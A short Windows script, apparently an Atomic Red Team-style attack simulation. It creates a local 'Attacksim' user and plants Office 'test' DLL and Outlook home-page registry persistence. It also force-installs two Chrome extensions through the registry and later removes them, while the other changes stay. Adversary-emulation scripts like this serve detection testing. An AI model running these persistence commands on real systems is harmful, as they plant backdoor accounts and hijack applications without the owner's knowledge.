@echo Off
Get-LocalUser
$Password = Read-Host -AsSecureString
New-LocalUser "Attacksim" -Password $Password -FullName "AttackSimulation" -Description "SMAK"
Get-LocalUser
cmd.exe /C reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d "C:\Path\AtomicRedTeam.dll"
cmd.exe /C reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://d43bfc_T1137.004.html /f 
$extList = "fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"
foreach ($extension in $extList) {New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force; New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
Start chrome
Start-Sleep -Seconds 30
Stop-Process -Name "chrome"	
$extList = "fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"
foreach ($extension in $extList) {
Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
